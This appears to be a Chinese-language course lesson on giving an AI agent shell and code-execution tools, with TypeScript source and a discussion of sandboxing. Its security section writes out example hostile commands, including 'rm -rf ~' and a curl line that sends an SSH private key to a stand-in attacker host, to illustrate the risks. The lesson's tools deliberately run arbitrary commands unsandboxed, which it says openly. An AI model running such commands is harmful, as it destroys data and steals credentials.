# Shell 工具与代码执行

## 概述

本课程是关于为你的 Agent 配备一台计算机。当 Agent 能够执行 Shell 命令和运行代码时,它就从文本生成器转变为真正能够**做事情**的存在——就像坐在终端前的软件工程师一样。

## 计算机访问的力量

像 Claude Code、Devin 和其他 Agent 编码系统背后的洞察很简单:**给 AI 提供程序员每天使用的相同工具**。

当你作为开发者解决问题时,你不仅仅是在思考——你会:
- 运行命令来探索系统(`ls`、`cat`、`grep`)
- 执行代码来测试假设
- 安装包和依赖项
- 运行构建和测试
- 与 API 和服务交互

没有计算机访问权限的 Agent 只能**告诉你**做什么。拥有计算机访问权限的 Agent 则可以实际执行这些操作。

## 为什么这很重要

### 代码作为精确的输出格式

文本是模糊的。代码是精确的。当 Agent 生成代码并执行它时,不存在解释间隙。计算机完全按照代码所说的执行。

这就是能够编写和运行代码的 Agent 能力如此强大的原因:
- 生成 Python 脚本来处理 CSV——然后真正运行它
- 编写 bash 命令来查找文件——然后执行它并使用结果
- 创建可视化——然后渲染它并显示输出

### 通过执行实现自我验证

当 Agent 能够运行自己的代码时,它会获得即时反馈。如果代码失败,它会看到错误。它可以迭代、调试和修复问题——就像人类开发者一样。

这创建了一个紧密的反馈循环:
1. Agent 生成代码
2. Agent 执行代码
3. Agent 看到输出(或错误)
4. Agent 调整并重试

没有执行,Agent 是在盲目飞行。有了执行,它可以自我纠正。

### 无限扩展能力

Shell 命令工具不仅为 Agent 提供一种能力——它提供了终端可以做的**所有**操作的访问权限:
- 文件系统操作
- 网络请求(`curl`、`wget`)
- 包管理(`npm`、`pip`)
- Git 操作
- Docker 命令
- 数据库查询
- 以及任何你可以从命令行运行的操作

你不需要为每种可能的操作都构建一个工具。你构建一个 Shell 工具,Agent 就可以弄清楚其余的部分。

## 两种方法:Shell vs 代码执行

我们实现了两个互补的工具:

### Shell 工具(`runCommand`)
直接访问终端。Agent 提供一个命令字符串,我们通过 Shell 执行它。

**最适合:**
- 快速系统操作
- 文件探索
- 运行现有脚本/二进制文件
- Git 命令
- 包管理

### 代码执行工具(`executeCode`)
更高级别的抽象。Agent 提供特定语言的代码,我们负责将其写入临时文件并使用适当的运行时执行。

**最适合:**
- 多步计算
- 数据处理
- 用代码更容易表达的复杂逻辑
- 当 Agent 需要通过可执行代码"大声思考"时

### 为什么需要两者?

Shell 工具是更低级和更灵活的。代码执行工具是更结构化和语言感知的。

在实践中,Agent 从两者中受益:
- 使用 `runCommand` 进行快速操作:`ls -la`、`git status`、`npm install`
- 使用 `executeCode` 进行计算:数据分析、算法、转换

一些团队只实现 Shell 工具,让 Agent 将代码写入文件,然后通过 Shell 命令执行这些文件。这也行得通,但专用代码执行工具为"运行此代码"与"运行此命令"提供了更清晰的接口。

## 安全考虑

为 Agent 提供 Shell 访问权限是强大的——也是危险的。需要考虑:

- **破坏性命令**:`rm -rf /`、`DROP TABLE` 等
- **资源耗尽**:无限循环、fork 炸弹 [译者注:fork 炸弹是一种通过不断创建进程来耗尽系统资源的攻击方式]
- **数据泄露**:将敏感数据发送到外部服务器
- **权限提升**: `sudo` 命令、访问受保护的资源

### 我们的方法:简单但不安全

本课程中的实现在你**的主机上直接运行命令**,拥有你用户的完全权限。这是有意为之——它保持代码简单,这样我们可以专注于 Agent 架构,而不是基础设施。

**这不是生产就绪的。** 如果 Agent 决定运行 `rm -rf ~` 或 `curl attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`,它会成功。你完全信任这个模型。

对于学习和本地开发,这没问题。你正在观察 Agent,你可以按 Ctrl+C,最坏的情况是你弄坏了你自己的机器。

### 生产环境:沙箱执行

真正的代码执行系统使用**沙箱隔离**——限制代码可以做什么的隔离环境:

**容器隔离(Docker、gVisor、Firecracker)**
- 代码在一次性容器中运行
- 文件系统是临时的——执行后没有任何内容持久化
- 进程隔离防止逃逸到主机 [译者注:容器逃逸是指攻击者从容器内部突破隔离,获得宿主机访问权限的漏洞利用方式]

**网络隔离**
- 默认情况下无互联网访问
- 无法向外部服务器回传数据 [译者注:phone home 指程序自动向外部服务器发送数据的行为]
- 无法访问内部网络资源
- Anthropic 的代码执行工具:"出于安全考虑,互联网访问完全被禁用"

**资源限制**
- CPU 时间限制(N 秒后杀死)
- 内存上限(通常 5GB)
- 磁盘配额
- 进程数量限制(防止 fork 炸弹)

**Seccomp/AppArmor 配置文件**
- 限制允许的系统调用
- 在内核级别阻止危险操作
- 即使代码尝试 `rm -rf /`,系统调用也会被拒绝

**临时环境**
- 每次执行都获得一个全新的环境
- 状态在执行之间不持久化
- 恶意代码无法"安装"后门

例如,Claude Code 使用沙箱架构:
- 使用文件系统和网络控制隔离 bash 执行
- 自动允许安全操作
- 阻止已知的恶意模式
- 仅对模棱两可的情况请求权限

关键洞察:**即使提示注入成功,损害也被限制**。沙箱中受损的 Agent 无法窃取你的 SSH 密钥或泄露数据 [译者注:提示注入(Prompt Injection)是一种攻击技术,通过精心设计的输入来操纵 AI 系统的行为]。

### 何时使用什么方法

| 场景 | 方法 |
|------|------|
| 本地开发 | 直接执行(我们的方法) |
| 学习/课程 | 直接执行加监督 |
| 内部工具 | 建议使用沙箱隔离 |
| 面向用户的产品 | 强制沙箱隔离 |
| 处理不受信任的输入 | 严格的沙箱隔离 + 白名单 |

## 代码

### src/agent/tools/shell.ts

Shell 工具使用 `shelljs` 执行任意命令:

```typescript
import { tool } from "ai";
import { z } from "zod";
import shell from "shelljs";

/**
 * Run a shell command
 */
export const runCommand = tool({
  description:
    "Execute a shell command and return its output. Use this for system operations, running scripts, or interacting with the operating system.",
  inputSchema: z.object({
    command: z.string().describe("The shell command to execute"),
  }),
  execute: async ({ command }: { command: string }) => {
    const result = shell.exec(command, { silent: true });

    let output = "";
    if (result.stdout) {
      output += result.stdout;
    }
    if (result.stderr) {
      output += result.stderr;
    }

    if (result.code !== 0) {
      return `Command failed (exit code ${result.code}):\n${output}`;
    }

    return output || "Command completed successfully (no output)";
  },
});
```

关键实现细节:
- `silent: true` 防止输出直接进入控制台
- 我们同时捕获 stdout 和 stderr
- 非零退出代码被报告为失败
- 空输出获得确认消息

### src/agent/tools/codeExecution.ts

代码执行工具是一个复合工具——它在内部执行多个步骤:

```typescript
import { tool } from "ai";
import { z } from "zod";
import fs from "fs/promises";
import path from "path";
import os from "os";
import shell from "shelljs";

/**
 * Execute code by writing to temp file and running it
 * This is a composite tool that demonstrates doing multiple steps internally
 * vs letting the model orchestrate separate tools (writeFile + runCommand)
 */
export const executeCode = tool({
  description:
    "Execute code for anything you need compute for. Supports JavaScript (Node.js), Python, and TypeScript. Returns the output of the execution.",
  inputSchema: z.object({
    code: z.string().describe("The code to execute"),
    language: z
      .enum(["javascript", "python", "typescript"])
      .describe("The programming language of the code")
      .default("javascript"),
  }),
  execute: async ({
    code,
    language,
  }: {
    code: string;
    language: "javascript" | "python" | "typescript";
  }) => {
    // Determine file extension and run command based on language
    const extensions: Record<string, string> = {
      javascript: ".js",
      python: ".py",
      typescript: ".ts",
    };

    const commands: Record<string, (file: string) => string> = {
      javascript: (file) => `node ${file}`,
      python: (file) => `python3 ${file}`,
      typescript: (file) => `npx tsx ${file}`,
    };

    const ext = extensions[language];
    const getCommand = commands[language];
    const tmpFile = path.join(os.tmpdir(), `code-exec-${Date.now()}${ext}`);

    try {
      // Write code to temp file
      await fs.writeFile(tmpFile, code, "utf-8");

      // Execute the code
      const command = getCommand(tmpFile);
      const result = shell.exec(command, { silent: true });

      let output = "";
      if (result.stdout) {
        output += result.stdout;
      }
      if (result.stderr) {
        output += result.stderr;
      }

      if (result.code !== 0) {
        return `Execution failed (exit code ${result.code}):\n${output}`;
      }

      return output || "Code executed successfully (no output)";
    } catch (error) {
      const err = error as Error;
      return `Error executing code: ${err.message}`;
    } finally {
      // Clean up temp file
      try {
        await fs.unlink(tmpFile);
      } catch {
        // Ignore cleanup errors
      }
    }
  },
});
```

关键实现细节:
- 支持使用不同运行时的多种语言
- 使用临时目录避免污染工作目录
- 在 `finally` 块中清理临时文件
- TypeScript 通过 `tsx` 执行以实现无缝 TS 执行
- 这是一个"复合工具"——它在一个工具中完成可能是 2+ 个工具调用(写入文件、执行)的操作

### src/agent/tools/index.ts

在工具索引中注册这两个工具:

```typescript
import { readFile, writeFile, listFiles, deleteFile } from "./file.ts";
import { runCommand } from "./shell.ts";
import { executeCode } from "./codeExecution.ts";
import { webSearch } from "./webSearch.ts";

// All tools combined for the agent
export const tools = {
  readFile,
  writeFile,
  listFiles,
  deleteFile,
  runCommand,
  executeCode,
  webSearch,
};

// Export individual tools for selective use in evals
export { readFile, writeFile, listFiles, deleteFile } from "./file.ts";
export { runCommand } from "./shell.ts";
export { executeCode } from "./codeExecution.ts";
export { webSearch } from "./webSearch.ts";

// Tool sets for evals
export const fileTools = {
  readFile,
  writeFile,
  listFiles,
  deleteFile,
};

export const shellTools = {
  runCommand,
};
```

## 复合工具 vs 编排工具

`executeCode` 工具是一个有趣的设计选择。我们可以让 Agent:
1. 调用 `writeFile` 创建临时文件
2. 调用 `runCommand` 执行它
3. 调用 `deleteFile` 清理

相反,我们将所有三个步骤捆绑到一个工具中。权衡:

**复合工具(我们所做的):**
- 减少模型的往返次数
- Agent 不需要知道临时文件
- 更清晰的心理模型:"执行此代码"
- 灵活性较低——Agent 无法自定义中间步骤

**编排(让 Agent 协调):**
- Agent 对每个步骤有完全控制
- 可以检查中间结果
- 更多 token/延迟(多次工具调用)
- Agent 可能忘记清理

对于"执行代码",复合方法是有意义的。中间步骤并不有趣——我们只是想要输出。对于更复杂的工作流,让 Agent 编排可能更好。


## 来源

- [Claude Code: Anthropic's Agent in Your Terminal](https://www.latent.space/p/claude-code)
- [Code execution tool - Claude API](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- [Building agents with the Claude Agent SDK](https://www.anthropic.com/engineering/building-agents-with-the-claude-agent-sdk)
- [Claude Code: Best practices for agentic coding](https://www.anthropic.com/engineering/claude-code-best-practices)
- [Making Claude Code more secure with sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
